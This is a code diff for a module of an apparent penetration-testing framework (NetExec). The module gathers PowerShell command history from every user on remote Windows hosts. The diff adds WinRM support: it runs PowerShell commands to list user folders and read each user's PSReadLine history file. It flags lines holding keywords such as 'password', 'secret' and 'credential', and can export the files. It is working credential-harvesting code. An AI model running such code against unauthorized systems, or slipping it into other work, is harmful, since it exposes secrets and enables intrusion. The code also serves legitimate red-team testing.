@@ -10,7 +10,7 @@ class NXCModule:
 
     name = "powershell_history"
     description = "Extracts PowerShell history for all users and looks for sensitive commands."
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb", "winrm"]
     false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
     sensitive_keywords = [
         "password", "passw", "secret", "credential", "key",
@@ -22,37 +22,86 @@ class NXCModule:
     def options(self, _, module_options):
         self.export = bool(module_options.get("EXPORT", False))
 
-    def on_admin_login(self, context, connection):
-        for directory in connection.conn.listPath("C$", "Users\\*"):
-            if directory.get_longname() not in self.false_positive and directory.is_directory():
+    def on_login(self, context, connection):
+        if "winrm" in context.protocol:
+            grab_users = "ls C:\\Users | where { $_.PSIsContainer } | ForEach-Object { $_.Name } | Out-String"
+            users_raw = connection.execute(
+                payload = grab_users,
+                get_output = True,
+                shell_type = "powershell",
+            )
+            users = [user.strip() for user in users_raw.splitlines() if user.strip() and user.strip() not in self.false_positive]
+            for user in users:
                 try:
-                    powershell_history_dir = f"Users\\{directory.get_longname()}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\"
-                    for file in connection.conn.listPath("C$", f"{powershell_history_dir}\\*"):
-                        if file.get_longname() not in self.false_positive:
-                            file_path = f"{powershell_history_dir}{file.get_longname()}"
-                            
-                            buf = BytesIO()
-                            connection.conn.getFile("C$", file_path, buf.write)
-                            buf.seek(0)
-                            file_content = buf.read().decode("utf-8", errors="ignore")
-                            keywords = [keyword.upper() for keyword in self.sensitive_keywords if keyword.lower() in file_content.lower()]
-                            if len(keywords):
-                                context.log.highlight(f"C:\\{file_path} [ {' '.join(keywords)} ]")
-                            else:
-                                context.log.highlight(f"C:\\{file_path}")
+                    powershell_history_dir = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\"
+                    files = connection.execute(
+                        payload = f"Get-ChildItem -Path '{powershell_history_dir}' | Select-Object -ExpandProperty Name",
+                        get_output = True,
+                        shell_type = "powershell",
+                    )
+                    for file in files.splitlines():
+                        if file.strip() not in self.false_positive:
+                            file_path = f"{powershell_history_dir}{file.strip()}"
+                            file_content = connection.execute(
+                                payload = f"Get-Content -Path '{file_path}'",
+                                get_output = True,
+                                shell_type = "powershell",
+                            )
 
-                            for line in file_content.splitlines():
-                                context.log.highlight(f"\t{line}")    
+                            lower_keys = [kw.lower() for kw in self.sensitive_keywords]
+
+                            for raw_line in file_content.splitlines():
+                                line = raw_line.lower()
+                                if any(kw in line for kw in lower_keys):
+                                    context.log.highlight(f"C:\\{file_path} [ {raw_line.strip()} ]")
+
                             if self.export:
-                                filename = f"{connection.host}_{directory.get_longname()}_powershell_history.txt"
+                                filename = f"{connection.host}_{user}_powershell_history.txt"
                                 export_path = join(NXC_PATH, "modules", "powershell_history")
                                 path = abspath(join(export_path, filename))
                                 makedirs(export_path, exist_ok=True)
                                 try:
-                                    with open(path, "w+") as file:
-                                        file.write(file_content)
+                                    with open(path, "w+") as file_handle:
+                                        file_handle.write(file_content)
                                     context.log.highlight(f"PowerShell history written to: {path}")
                                 except Exception as e:
                                     context.log.fail(f"Failed to write history to {filename}: {e}")
-                except Exception:
-                    pass
+                except Exception as e:
+                    context.log.fail(f"Error processing user {user}: {e}")
+            return
+
+    def on_admin_login(self, context, connection):
+        if "smb" in context.protocol:
+            for directory in connection.conn.listPath("C$", "Users\\*"):
+                if directory.get_longname() not in self.false_positive and directory.is_directory():
+                    try:
+                        powershell_history_dir = f"Users\\{directory.get_longname()}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\"
+                        for file in connection.conn.listPath("C$", f"{powershell_history_dir}\\*"):
+                            if file.get_longname() not in self.false_positive:
+                                file_path = f"{powershell_history_dir}{file.get_longname()}"
+                                
+                                buf = BytesIO()
+                                connection.conn.getFile("C$", file_path, buf.write)
+                                buf.seek(0)
+                                file_content = buf.read().decode("utf-8", errors="ignore")
+                                keywords = [keyword.upper() for keyword in self.sensitive_keywords if keyword.lower() in file_content.lower()]
+                                if len(keywords):
+                                    context.log.highlight(f"C:\\{file_path} [ {' '.join(keywords)} ]")
+                                else:
+                                    context.log.highlight(f"C:\\{file_path}")
+
+                                for line in file_content.splitlines():
+                                    context.log.highlight(f"\t{line}")    
+                                if self.export:
+                                    filename = f"{connection.host}_{directory.get_longname()}_powershell_history.txt"
+                                    export_path = join(NXC_PATH, "modules", "powershell_history")
+                                    path = abspath(join(export_path, filename))
+                                    makedirs(export_path, exist_ok=True)
+                                    try:
+                                        with open(path, "w+") as file:
+                                            file.write(file_content)
+                                        context.log.highlight(f"PowerShell history written to: {path}")
+                                    except Exception as e:
+                                        context.log.fail(f"Failed to write history to {filename}: {e}")
+                    except Exception:
+                        pass
